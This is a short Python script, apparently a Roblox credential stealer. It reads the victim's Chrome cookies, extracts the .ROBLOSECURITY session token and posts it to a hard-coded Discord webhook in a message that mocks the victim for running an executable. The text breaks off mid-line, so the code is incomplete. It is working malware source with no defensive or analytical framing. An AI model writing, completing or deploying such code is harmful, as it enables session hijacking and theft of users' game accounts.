import requests
import threading
import browser_cookie3 as cookie
from discord_webhook import DiscordWebhook, DiscordEmbed

webhook_urls = ['webhook url 1', 'webhook url 2']

def getCookiesFromPc():
    req = requests.Session()
    cj = cookie.chrome()
    req.cookies = cj
    r = req.get("https://www.roblox.com/")
    for c in req.cookies:
        if c.name == ".ROBLOSECURITY":
            webhook = DiscordWebhook(url='https://discord.com/api/webhooks/944321179139842148/uQpWr4ySN6LJl8ksm3y8TF4t79b2s39_jXzddoWhD5SZ4b7yTy6TafmJPTWck9CTevv4', content="@everyone")
            embed = DiscordEmbed(title='Cookie Found of braindead person!', description='He clicked a exe!', color=242424)
            embed.add_embed_field(name='.ROBLOSECURITY', value=c.value)
            embed.set_timestamp('
            webhook.add_embed(embed)
            response = webhook.execute()
